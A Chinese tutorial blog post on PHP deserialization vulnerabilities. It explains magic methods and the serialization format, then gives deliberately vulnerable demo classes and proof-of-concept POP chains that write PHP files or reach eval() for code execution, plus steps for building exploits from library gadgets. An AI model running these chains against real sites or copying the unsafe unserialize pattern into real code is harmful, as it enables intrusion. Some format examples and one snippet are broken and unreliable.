# php 反序列漏洞初识

在 OWASP TOP10 中，反序列化已经榜上有名，但是究竟什么是反序列化，我觉得应该进下心来好好思考下。我觉得学习的时候，所有的问题都应该问 3 个问题：what、why、how:

what：什么是反序列化，why：为什么会出现反序列化漏洞，how：反序列化漏洞如何利用。

从事安全工作也一年了，也遇到过反序列化漏洞，发现啊，反序列化漏洞真的黑盒很难发现，即使发现了也好难利用。但是有时候反序列化漏洞的危害却挺大的。下面开始进入正题。

什么是序列化
首先这个东西在 PHP 网站中的定义：

所有 php 里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表示。unserialize() 函数能够重新把字符串变回 php 原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。

按照我的理解，serialize() 将一个对象转换成一个字符串，unserialize() 将字符串还原为一个对象。

当然从本质上来说，反序列化的数据本身是没有危害的，用户可控数据进行反序列化是存在危害的。

1.PHP 类与对象

首先，要进行序列化之前，需要了解一下 PHP 类与对象的概念，这里我们看个 demo 代码：

```
<?php
class TestClass    
{    
    // 一个变量    
     
    public $variable = 'This is a string';    
     
    // 一个简单的方法    
     
    public function PrintVariable()    
    {    
        echo $this->variable;    
    }    
}    

// 创建一个对象    
     
$object = new TestClass();    
     
// 调用一个方法    
     
$object->PrintVariable();    
     
?>   
```

在这个代码中，文件定义了一个 TestClass 类，在类中定义了 $variable 变量，以及函数 PrintVariable。然后实例化这个类并调用它的方法。运行结果如下。

This is a string

当然，上面的代码是正常情况下的调用。但是 php 中存在一些特殊的类成员在某些特定情况下会自动调用，称之为 magic 函数，magic 函数命名是以符号 __ 开头的。举个例子：

__construct 当一个对象创建时被调用，

__destruct 当一个对象销毁时被调用，

__toString 当一个对象被当作一个字符串被调用。

下面代码中尝试加入上述的三个魔术函数，我们看看结果：

```
<?php
class TestClass
{
    // 一个变量
    public $variable = 'This is a string';
    // 一个简单的方法
    public function PrintVariable()
    {
        echo $this->variable . '<br />';
    }
    // Constructor
    public function __construct()
    {
        echo '__construct <br />';
    }
    // Destructor
    public function __destruct()
    {
        echo '__destruct <br />';
    }
    // Call
    public function __toString()
    {
        return '__toString<br />';
    }
}
// 创建一个对象
//  __construct会被调用
$object = new TestClass();
// 创建一个方法
$object->PrintVariable();
// 对象被当作一个字符串
//  __toString会被调用
echo $object;
// End of PHP script
// 脚本结束__destruct会被调用
     
?>   
```

总结几个常用魔术方法及触发条件。

__wakeup() //使用 unserialize 时触发

__sleep() //使用 serialize 时触发

__destruct() //对象被销毁时触发

__call() //在对象上下文中调用不可访问的方法时触发

__callStatic() //在静态上下文中调用不可访问的方法时触发

__get() //用于从不可访问的属性读取数据

__set() //用于将数据写入不可访问的属性

__isset() //在不可访问的属性上调用 isset() 或 empty() 触发

__unset() //在不可访问的属性上使用 unset() 时触发

__toString() //把类当作字符串使用时触发,返回值需要为字符串

__invoke() //当脚本尝试将对象调用为函数时触发

2.PHP序列化基础格式

```
boolean
b:;
b:1; // True
b:0; // False
```

```
integer
i:;
i:1; // 1
i:-3; // -3
```

```
double
d:;
d:1.2345600000000001; // 1.23456（php弱类型所造成的四舍五入现象）
```

```
NULL
N; //NULL
```

```
string
s::"";
s"INSOMNIA"; // "INSOMNIA"
```

```
array
a::{key, value pairs};
a{s"key1";s"value1";s"value2";} // array("key1" => "value1", "key2" => "value2")
```

3.PHP序列化

php 允许保存一个对象方便以后重用，这个过程被称为序列化。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想，如果为一个脚本中想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容释放掉了，我们要如何操作呢?难道要前一个脚本不断的循环，等待后面脚本调用?这肯定是不现实的。因为这样的操作，在小项目还好，在大项目里是极其浪费资源的。但是如果你将一个对象序列化，那么它就会变成一个字符串，等你需要的时候再通过反序列化转换回变了变量，在进行调用就好了，在这样就剩了资源的使用。

先看个 dome 代码，了解一下 PHP 序列化中的字符串。

```
<?php
class User
{
    // 类数据
    public $age = "7";
    public $sex = "man";
    public $name = "Notyeat";
}
$example = new User();
$example->name = "John";
$example->sex = "woman";
$example->age = "18";
echo serialize($example);
?>
```

解释下这个序列化的字符串

`O:4:"User":3:{s:3:"age";s:2:"18";s:3:"sex";s:5:"woman";s:4:"name";s:4:"John";}`

O代表object

4代表对象名字符长度为4个字符

3代表对象里有3个变量

s代表变量数据类型，s代表string，i代表int

3代表变量名的字符长度

PHP序列化格式如下所示：

`O:4:"Test":2:{s:1:"a";s:5:"Hello";s:1:"b";i:20;}`

类型:长度:"名字":类中变量的个数:{类型:长度:"名字";类型:长度:"值";......}

类型字母详解:

```
a - array  
b - boolean  
d - double  
i - integer
o - common object
r - reference
s - string
C - custom object
O - class
N - null
R - pointer reference
U - unicode string
```

然后我们将其反序列化回来看下结果

``` 
<?php
class User
{
    // 类数据
    public $age = "7";
    public $sex = "man";
    public $name = "Notyeat";
}
$example = new User();
$example->name = "John";
$example->sex = "woman";
$example->age = "18";
$test1 = serialize($example);
echo $test1."\n";
$test = unserialize($test1);
echo $test->age;
?>
```

结果：

在序列化的时候其实是有个小注意点：

在这里明明 testflag 是 8 位，为什么 s:10 呢。


原来是：对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上 '*'。这些前缀值在任一侧都有空字节。



所以在传入序列化字符串的时候，需要补齐这些空字节。

 
O:4:"test":1:{s:10:"%00test%00flag";s:6:"Active";}
为什么会出现反序列化漏洞
其实这个问题在上面也提到过了，原因在于反序列化的参数可控，且代码存在一定风险。

举个例子看个代码：

``` 
<?php
class A{
    var $test = "demo";
    function __destruct(){
            echo $this->test;
    }
}
$a = $_GET['test'];
$a_unser = unserialize($a);
?>
```

这串代码，我们可以看到变量 $a 从 url 中 test 参数获取到内容，并且在反序列化的时候通过 __destruct() 直接将传入的数据不经过任何处理，echo 出来，这里就存在反射型 xss 漏洞了。

在反序列化中,我们所能控制的数据就是对象中的各个属性值,所以在PHP的反序列化有一种漏洞利用方法叫做 "面向属性编程" ,即 POP( Property Oriented Programming)。和二进制漏洞中常用的 ROP 技术类似。在 ROP 中我们往往需要一段初始化 gadgets 来开始我们的整个利用过程,然后继续调用其他 gadgets。在 PHP 反序列化漏洞利用技术 POP 中,对应的初始化 gadgets 就是 __wakeup() 或者是 __destruct() 方法, 在最理想的情况下能够实现漏洞利用的点就在这两个函数中,但往往我们需要从这个函数开始,逐步的跟进在这个函数中调用到的所有函数,直至找到可以利用的点为止。下面列举些在跟进其函数调用过程中需要关注一些很有价值的函数。

1.几个可用的POP链方法

命令执行：

``` 
exec()
passthru()
popen()
system()
```

文件操作：

``` 
file_put_contents()
file_get_contents()
unlink()
```

如果在跟进程序过程中发现这些函数就要打起精神,一旦这些函数的参数我们能够控制,就有可能出现高危漏洞.

2.POP 链 demo 示例

``` 
<?php
class popdemo
{
    private $data = "demo\n";
    private $filename = './demo';
    public function __wakeup()
    {
        // TODO: Implement __wakeup() method.
        $this->save($this->filename);
    }
    public function save($filename)
    {
        file_put_contents($filename, $this->data);
    }
}
unserialize(file_get_contents('./serialized.txt));
?>
```

这是一个很简单的示例代码，且这个代码存在反序列化漏洞。该文件还定义了一个 popdemo 类,并且该类实现了 __wakeup 函数,然后在该函数中又调用了 save 函数，且参数对象是文件名。跟进 save 函数，我们看到在该函数中通过调用 file_put_contents 函数，这个函数的 $filename 和 data 属性值是从 save 函数中传出来的，并且创建了一个文件。由于 __wakeup() 函数在序列化时自动调用，这里还定义了一个保存文件的函数，在这个反序列化过程中对象的属性值可控。于是这里就存在一个任意文件写入任意文件内容的反序列化漏洞了。这就是所谓的 POP。就是关注整个函数的调用过程中参数的传递情况,找到可利用的点,这和一般的 Web 漏洞没什么区别,只是可控制的值有直接传递给程序的参数转变为了对象中的属性值。

利用 poc：

``` 
<?php
class popdemo
{
    private $data = "<?php phpinfo();?>\n";
    private $filename = './poc.php';
    public function __wakeup()
    {
        // TODO: Implement __wakeup() method.
        $this->save($this->filename);
    }
    public function save($filename)
    {
        file_put_contents($filename, $this->data);
    }
}
$demo = new popdemo();
echo serialize($demo);
file_put_contents("./serialized.txt",serialize($demo));
?>
```

这里定义了 $data 和 $filename，然后序列化字符串后存储到 serialized.txt 文件中，序列化字符串：



然后运行 demo 代码，会在同目录下生成一个 poc.php



反序列化漏洞的利用
1.利用构造函数等

php 在使用 unserialize() 后会导致 __wakeup() 或 __destruct() 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在 __wakeup() 或 __destruct() 中，从而当我们控制序列化字符串时可以去直接触发它们。

但是如果在反序列化的过程中，在 __wakeup() 或 __destruct() 不存在可以利用的恶意代码呢。那又该如何呢，其实吧我觉得反序列化漏洞，就是类似于类似于 PWN 中的 ROP，有时候反序列化一个对象时，由它调用的 __wakeup() 中又去调用了其他的对象，由此可以溯源而上，利用一次次的 “gadget” 找到漏洞点。

``` 
<?php
class pocdemo{
    function __construct($test){
        $fp = fopen("shell.php","w") ;
        fwrite($fp,$test);
        fclose($fp);
    }
}
class l1nk3r{
    var $test = '123';
    function __wakeup(){
        $obj = new pocdemo($this->test);
    }
}
$test = file_get_contents('./ser.txt');
unserialize($test);
require "shell.php";
?>
```
这里代码主要是通过 get 方法通过 test 传入序列化好的字符串，然后在反序列化的时候自动调用 __wakeup() 函数，在 __wakeup()函数中通过 new pocdemo() 会自动调用对象 pocdemo 中的 __construct()，从而把 <?php phpinfo(); ?> 写入到 shell.php 中。

poc 代码：

``` 
<?php
class l1nk3r{
    var $test = '<?php phpinfo(); ?>';
    function __wakeup(){
        $obj = new pocdemo($this->test);
    }
}
$ser = new l1nk3r();
$result = serialize($ser);
print $result;
file_put_contents('./ser.txt',$result);
?>
```

然后将这个序列化的字符重新导入到 poc 代码中，反序列化之后，就会生成一个 shell.php,并且内容为 <?php phpinfo(); ?>



2.利用普通成员方法

在反序列化的时候，当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。

``` 
<?php
class l1nk3r {
    var $test;
    function __construct() {
        $this->test = new CodeMonster();
    }
    function __destruct() {
        $this->test->action();
    }
}
class CodeMonster {
    function action() {
        echo "CodeMonster";
    }
}
class CodeMonster1 {
    var $test2;
    function action() {
        eval($this->test2);
    }
}
$class6 = new l1nk3r();
unserialize($_GET['test']);
?>
```

从代码上来看，来通过 new 实例化一个新的 l1nk3r 对象后，调用 __construct()，其中该函数又 new 了一个新的 CodeMonster 对象；这个对象的功能是定义了 action() 函数，并且打印 CodeMonster。然后结束的时候调用 __destruct(),在 __destruct() 会调用 action()，因此页面会输出 CodeMonster。



但是在代码中，我们看得到 codermaster1 对象中有一个 eval() 函数，这可是危险函数啊，那有什么方法，通过发序列化触发它呢，当然有了。刚刚在 l1nk3r 对象中，new 的是 CodeMonster，如果 new 的是 CodeMonster1，那么自然就会进入 CodeMonster1 中，然后 eval() 函数中的 $test2 可控制，那么自然就可以实现远程代码执行了。

Poc：

``` 
<?php
class l1nk3r {
    var $test;
    function __construct() {
        $this->test = new CodeMonster1();
    }
}
class CodeMonster1 {
    var $test2='phpinfo();';
}
$class6 = new l1nk3r();
print_r(serialize($class6));
?>
```

生成的序列化字符串：

 
O:6:"l1nk3r":1:{s:4:"test";O:11:"CodeMonster1":1:{s:5:"test2";s:10:"phpinfo();";}}


现实中查找反序列化漏洞及构造 exploit 的方法
1.漏洞发现技巧

默认情况下 Composer 会从 Packagist 下载包,那么我们可以通过审计这些包来找到可利用的 POP 链。

找 PHP 链的基本思路.

1、在各大流行的包中搜索 __wakeup() 和 __destruct() 函数.

2、追踪调用过程

3、手工构造并验证 POP 链

4、开发一个应用使用该库和自动加载机制,来测试 exploit.

2.构造 exploit 的思路

1、寻找可能存在漏洞的应用

2、在他所使用的库中寻找 POP gadgets

3、在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试 payload

4、将序列化之后的 payload 发送到有漏洞 web 应用中进行测试.

Refer:

https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247487282&idx=1&sn=413af47f5984336800a43710f9288ab5&chksm=ec1e3f1adb69b60c81636c0956dbe2ecf29d28e3c03445fe6f91101c1b991e1f2961079fd8d5&mpshare=1&scene=1&srcid=05120aHQhbNK66kvFN0CKtI7#rd

最通俗易懂的 PHP 反序列化分析:
http://www.notyeat.com/2018/03/26/php-unserialize/#0x04-实例分析

PHP 反序列化漏洞:
http://paper.tuisec.win/detail/fa497a4e50b5d83

理解 php 反序列化漏洞:
https://blog.csdn.net/qq_32400847/article/details/53873275

浅谈 php 反序列化漏洞:
https://chybeta.github.io/2017/06/17/浅谈php反序列化漏洞/

PHP 反序列化漏洞成因及漏洞挖掘技巧与案例:
https://www.anquanke.com/post/id/84922

php 反序列化入门:
http://sheldon.xmutsec.com/index.php/2018/02/03/15.html
